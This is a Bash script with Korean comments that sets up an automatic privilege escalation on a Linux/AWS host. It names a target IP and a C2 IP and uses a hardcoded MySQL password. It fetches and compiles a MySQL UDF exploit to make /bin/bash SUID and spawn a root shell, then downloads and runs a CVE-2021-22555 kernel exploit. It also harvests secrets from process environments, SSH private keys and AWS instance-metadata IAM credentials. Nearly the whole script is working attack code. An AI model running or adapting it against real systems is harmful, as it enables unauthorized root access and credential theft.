#!/bin/bash
# 즉시 실행 스크립트 - 우선순위별 권한 상승 시도

echo "=========================================="
echo "권한 상승 자동 실행 스크립트"
echo "=========================================="

TARGET_IP="3.34.181.145"
C2_IP="13.158.67.78"

echo ""
echo "=== 1단계: 환경 확인 ==="
echo ""

# Python 확인
echo "[*] Python 확인:"
which python3
which python

# gcc 확인
echo "[*] gcc 확인:"
which gcc
gcc --version 2>/dev/null | head -1

# wget/curl 확인
echo "[*] 다운로드 도구:"
which wget
which curl

echo ""
echo "=== 2단계: MySQL 상세 확인 ==="
echo ""

# MySQL 권한 및 설정 확인
cat << 'MYSQL_CHECK' > /tmp/mysql_check.sql
SELECT '=== Plugin Directory ===' AS Info;
SELECT @@plugin_dir;

SELECT '=== Secure File Priv ===' AS Info;
SELECT @@secure_file_priv;

SELECT '=== MySQL Version ===' AS Info;
SELECT VERSION();

SELECT '=== User Privileges ===' AS Info;
SELECT user, host, Super_priv, File_priv FROM mysql.user WHERE user='webuser';

SELECT '=== Current User ===' AS Info;
SELECT USER(), CURRENT_USER();

SELECT '=== Show Grants ===' AS Info;
SHOW GRANTS;
MYSQL_CHECK

echo "[*] MySQL 설정 확인 중..."
mysql -u webuser -p'WebPassw0rd!' < /tmp/mysql_check.sql 2>/dev/null

echo ""
echo "=== 3단계: MySQL UDF 시도 ==="
echo ""

# raptor_udf2.c 다운로드 시도
echo "[*] raptor_udf2.c 다운로드 중..."
cd /tmp
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c 2>/dev/null

if [ -f raptor_udf2.c ]; then
    echo "[+] raptor_udf2.c 다운로드 성공"

    # 컴파일 시도
    echo "[*] 컴파일 시도 중..."
    export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"

    gcc -g -c raptor_udf2.c -fPIC 2>/dev/null
    gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 2>/dev/null

    if [ -f raptor_udf2.so ]; then
        echo "[+] 컴파일 성공!"
        ls -la raptor_udf2.so
        file raptor_udf2.so

        # MySQL UDF 로드
        echo "[*] MySQL UDF 로드 중..."

        mysql -u webuser -p'WebPassw0rd!' << 'UDFEOF'
USE mysql;
CREATE TABLE IF NOT EXISTS udf_temp(line blob);
DELETE FROM udf_temp;
UDFEOF

        mysql -u webuser -p'WebPassw0rd!' mysql -e "INSERT INTO udf_temp VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));" 2>/dev/null

        mysql -u webuser -p'WebPassw0rd!' mysql -e "SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';" 2>/dev/null

        mysql -u webuser -p'WebPassw0rd!' mysql -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';" 2>/dev/null

        # SUID bash 생성
        mysql -u webuser -p'WebPassw0rd!' mysql -e "SELECT do_system('chmod u+s /bin/bash');" 2>/dev/null

        # 확인
        echo "[*] SUID bash 확인:"
        ls -la /bin/bash

        if [ -u /bin/bash ]; then
            echo "[+] 성공! SUID bash 생성됨"
            echo "[*] root 쉘 실행:"
            /bin/bash -p -c "whoami && id"
            exit 0
        else
            echo "[-] UDF 로드 실패"
        fi
    else
        echo "[-] 컴파일 실패"
    fi
else
    echo "[-] raptor_udf2.c 다운로드 실패"
fi

echo ""
echo "=== 4단계: CVE-2021-22555 시도 ==="
echo ""

cd /tmp
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve22555.c 2>/dev/null

if [ -f cve22555.c ]; then
    echo "[+] CVE-2021-22555 다운로드 성공"

    echo "[*] 컴파일 중..."
    gcc -o cve22555 cve22555.c -static 2>/dev/null

    if [ -f cve22555 ]; then
        echo "[+] 컴파일 성공"
        echo "[*] exploit 실행 중..."
        chmod +x cve22555
        ./cve22555
        whoami
        exit 0
    else
        echo "[-] 컴파일 실패"
    fi
else
    echo "[-] CVE-2021-22555 다운로드 실패"
fi

echo ""
echo "=== 5단계: Splunk 확인 ==="
echo ""

echo "[*] Splunk 프로세스:"
ps aux | grep splunk | grep -v grep | head -5

echo "[*] Splunk가 root로 실행되는지:"
ps aux | grep splunk | grep root

echo "[*] Splunk writable 디렉토리:"
find /opt/splunk* -writable -type d 2>/dev/null | head -10

echo ""
echo "=== 6단계: Cron Jobs 확인 ==="
echo ""

echo "[*] /etc/crontab:"
cat /etc/crontab 2>/dev/null

echo "[*] /etc/cron.d/:"
ls -la /etc/cron.d/ 2>/dev/null
cat /etc/cron.d/* 2>/dev/null

echo "[*] writable cron 파일:"
find /etc/cron* -writable 2>/dev/null
test -w /etc/cron.d && echo "[+] /etc/cron.d is WRITABLE!"

echo ""
echo "=== 7단계: 프로세스 메모리 검색 ==="
echo ""

echo "[*] 프로세스 environ에서 비밀번호 검색:"
for pid in /proc/[0-9]*/environ; do
    cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret" 2>/dev/null
done | grep -v "LESSOPEN" | head -20

echo ""
echo "=== 8단계: 다른 사용자 확인 ==="
echo ""

echo "[*] 시스템 사용자:"
cat /etc/passwd | grep "/bin/bash\|/bin/sh" | grep -v "^root\|^#"

echo "[*] 홈 디렉토리:"
ls -la /home/ 2>/dev/null

echo "[*] SSH 키 파일:"
find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null

echo "[*] readable .ssh 디렉토리:"
find /home -type d -name ".ssh" -readable 2>/dev/null

echo ""
echo "=== 9단계: AWS 메타데이터 ==="
echo ""

# IMDSv1
echo "[*] IMDSv1 시도:"
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null

# IMDSv2
echo "[*] IMDSv2 시도:"
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
if [ -n "$TOKEN" ]; then
    ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    echo "Role: $ROLE"
    if [ -n "$ROLE" ]; then
        curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
    fi
fi

echo ""
echo "=========================================="
echo "스크립트 완료"
echo "=========================================="
